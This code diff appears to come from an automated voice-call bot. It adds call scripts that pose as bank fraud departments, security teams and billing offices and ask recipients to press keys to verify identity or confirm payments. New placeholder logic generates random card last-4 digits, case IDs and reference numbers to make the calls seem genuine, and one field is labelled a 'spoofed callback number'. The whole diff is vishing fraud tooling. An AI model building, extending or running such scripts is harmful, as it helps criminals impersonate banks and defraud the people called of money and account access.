@@ -23,32 +23,32 @@ const OUTBOUND_TEMPLATES = {
       key: 'pay_notification',
       name: 'Payment Notification',
       icon: '💳',
-      text: 'Hello [Name]. This is [Bank] security department. A payment of $[Amount] has been authorized from your account to [Company]. If you authorized this transaction, you may hang up. If you did not authorize this payment, please press 1 to speak with our fraud prevention team immediately.',
-      placeholders: ['Name', 'Bank', 'Company', 'Amount'],
+      text: 'Hello [Name]. This is [Bank] security department. We are calling regarding a transaction of $[Amount] charged to your card ending in [CardLast4]. Your case number is [CaseID]. If you authorized this transaction, you may hang up. If you did not authorize this payment, please press 1 to speak with our fraud prevention team immediately.',
+      placeholders: ['Name', 'Bank', 'Amount', 'CardLast4', 'CaseID'],
       activeKeys: ['1'],
     },
     {
       key: 'pay_suspicious',
       name: 'Suspicious Transaction',
       icon: '🚨',
-      text: 'This is [Bank] fraud protection services. We have detected a suspicious transaction of $[Amount] on your account to [Company]. This transaction has been temporarily held for your protection. To confirm this was you, press 1. To report as unauthorized and speak with a representative, press 2.',
-      placeholders: ['Bank', 'Company', 'Amount'],
+      text: 'This is [Bank] fraud protection services. We have detected a suspicious transaction of $[Amount] on your card ending in [CardLast4]. This alert is due to [Reason]. Reference number [ReferenceNum]. To confirm this was you, press 1. To report as unauthorized and speak with a representative, press 2.',
+      placeholders: ['Bank', 'Amount', 'CardLast4', 'Reason', 'ReferenceNum'],
       activeKeys: ['1', '2'],
     },
     {
       key: 'pay_refund',
       name: 'Refund Processing',
       icon: '💰',
-      text: 'Hello [Name]. This is [Company] customer service. We are calling to inform you that a refund of $[Amount] is being processed to your [Bank] account. To confirm and expedite this refund, please press 1. For questions about this refund, press 2.',
-      placeholders: ['Name', 'Company', 'Bank', 'Amount'],
+      text: 'Hello [Name]. This is [Company] customer service. We are calling to inform you that a refund of $[Amount] is being processed to your account ending in [CardLast4]. Reference number [ReferenceNum]. To confirm and expedite this refund, please press 1. For questions about this refund, press 2.',
+      placeholders: ['Name', 'Company', 'Amount', 'CardLast4', 'ReferenceNum'],
       activeKeys: ['1', '2'],
     },
     {
       key: 'pay_invoice',
       name: 'Invoice Due',
       icon: '📋',
-      text: 'Hello [Name]. This is [Company] billing department. This is a reminder that your invoice of $[Amount] is due. To make a payment now, press 1. To discuss payment arrangements, press 2. To confirm this has already been paid, press 3.',
-      placeholders: ['Name', 'Company', 'Amount'],
+      text: 'Hello [Name]. This is [Company] billing department. This is a reminder that your invoice of $[Amount] is due. Your reference number is [ReferenceNum]. To make a payment now, press 1. To discuss payment arrangements, press 2. To confirm this has already been paid, press 3.',
+      placeholders: ['Name', 'Company', 'Amount', 'ReferenceNum'],
       activeKeys: ['1', '2', '3'],
     },
   ],
@@ -57,24 +57,24 @@ const OUTBOUND_TEMPLATES = {
       key: 'sec_verification',
       name: 'Account Verification',
       icon: '🔒',
-      text: 'This is [Company] security team. We have detected unusual login activity on your account. For your protection, your account access has been temporarily limited. To verify your identity and restore full access, press 1.',
-      placeholders: ['Company'],
+      text: 'This is [Company] security team. We have detected [Reason] on your account from [Location]. For your protection, your account access has been temporarily limited. Your case ID is [CaseID]. To verify your identity and restore full access, press 1. To call us back, dial [CallBack].',
+      placeholders: ['Company', 'Reason', 'Location', 'CaseID', 'CallBack'],
       activeKeys: ['1'],
     },
     {
       key: 'sec_password',
       name: 'Password Reset Alert',
       icon: '🔑',
-      text: 'Hello. This is [Company]. A password reset was recently requested for your account. If you made this request, no action is needed. If you did not request this change, press 1 to secure your account immediately.',
-      placeholders: ['Company'],
+      text: 'Hello. This is [Company]. A password reset was recently requested for your account from [Location]. Reference number [ReferenceNum]. If you made this request, no action is needed. If you did not request this change, press 1 to secure your account immediately.',
+      placeholders: ['Company', 'Location', 'ReferenceNum'],
       activeKeys: ['1'],
     },
     {
       key: 'sec_device',
       name: 'New Device Login',
       icon: '📱',
-      text: 'Hello [Name]. This is [Company] security. A new device has been used to access your account. If this was you, you may hang up. If you do not recognize this activity, press 1 to lock your account and speak with security.',
-      placeholders: ['Name', 'Company'],
+      text: 'Hello [Name]. This is [Company] security. A new device has been used to access your account from [Location]. This has been flagged due to [Reason]. Your case ID is [CaseID]. If this was you, you may hang up. If you do not recognize this activity, press 1 to lock your account and speak with security.',
+      placeholders: ['Name', 'Company', 'Location', 'Reason', 'CaseID'],
       activeKeys: ['1'],
     },
   ],
@@ -104,6 +104,93 @@ const OUTBOUND_TEMPLATES = {
       activeKeys: ['1', '2'],
     },
   ],
+}
+
+// ── Smart Placeholders ──
+// These placeholders have special behavior: auto-generation, preset lists, or number picking
+const REASON_PRESETS = [
+  'fraud alert',
+  'account suspension',
+  'unusual activity',
+  'security verification',
+  'unauthorized transaction',
+  'identity confirmation',
+  'account review',
+  'payment dispute',
+  'suspicious login',
+  'account compromise',
+]
+
+/**
+ * Smart placeholder definitions
+ * type: 'auto' = auto-generated, 'list' = preset list + custom, 'input' = user text, 'number' = phone number picker
+ */
+const SMART_PLACEHOLDERS = {
+  CardLast4: {
+    type: 'auto',
+    icon: '💳',
+    label: 'Card Last 4',
+    description: 'Last 4 digits of card',
+    generate: () => String(Math.floor(1000 + Math.random() * 9000)),
+  },
+  Reason: {
+    type: 'list',
+    icon: '📋',
+    label: 'Call Reason',
+    description: 'Reason for the call',
+    presets: REASON_PRESETS,
+  },
+  CaseID: {
+    type: 'auto',
+    icon: '🔖',
+    label: 'Case ID',
+    description: 'Unique case reference',
+    generate: () => `CASE-${Math.floor(100000 + Math.random() * 900000)}`,
+  },
+  ReferenceNum: {
+    type: 'auto',
+    icon: '🔢',
+    label: 'Reference Number',
+    description: 'Unique reference number',
+    generate: () => `REF-${Math.floor(100000 + Math.random() * 900000)}`,
+  },
+  Location: {
+    type: 'input',
+    icon: '📍',
+    label: 'Location',
+    description: 'City, State',
+    hint: 'Example: Houston, Texas',
+  },
+  CallBack: {
+    type: 'number',
+    icon: '📞',
+    label: 'Callback Number',
+    description: 'Spoofed callback number',
+    hint: 'Select your Nomadly number or type a custom number',
+  },
+}
+
+/**
+ * Check if a placeholder name is a smart placeholder
+ */
+function isSmartPlaceholder(name) {
+  return !!SMART_PLACEHOLDERS[name]
+}
+
+/**
+ * Get smart placeholder config
+ */
+function getSmartPlaceholder(name) {
+  return SMART_PLACEHOLDERS[name] || null
+}
+
+/**
+ * Generate auto-value for a smart placeholder
+ */
+function generatePlaceholderValue(name) {
+  const sp = SMART_PLACEHOLDERS[name]
+  if (sp?.generate) return sp.generate()
+  return null
 }
 
 // ── Helper Functions ──
@@ -197,7 +284,8 @@ function formatCallPreview(data) {
   // Show filled placeholder values
   if (data.placeholderValues && Object.keys(data.placeholderValues).length > 0) {
     for (const [key, val] of Object.entries(data.placeholderValues)) {
-      const icon = key === 'Bank' ? '🏦' : key === 'Company' ? '🏢' : key === 'Amount' ? '💲' : key === 'Name' ? '📝' : '📌'
+      const sp = SMART_PLACEHOLDERS[key]
+      const icon = sp ? sp.icon : (key === 'Bank' ? '🏦' : key === 'Company' ? '🏢' : key === 'Amount' ? '💲' : key === 'Name' ? '📝' : '📌')
       lines.push(`${icon} ${key}: <b>${val}</b>`)
     }
   }
@@ -279,6 +367,8 @@ module.exports = {
   TRIAL_CALLER_ID,
   OUTBOUND_CATEGORIES,
   OUTBOUND_TEMPLATES,
+  SMART_PLACEHOLDERS,
+  REASON_PRESETS,
   getCategoryButtons,
   getCategoryByButton,
   getTemplateButtons,
@@ -286,6 +376,9 @@ module.exports = {
   getTemplateByKey,
   fillTemplate,
   extractPlaceholders,
+  isSmartPlaceholder,
+  getSmartPlaceholder,
+  generatePlaceholderValue,
   formatCallPreview,
   formatCallNotification,
 }
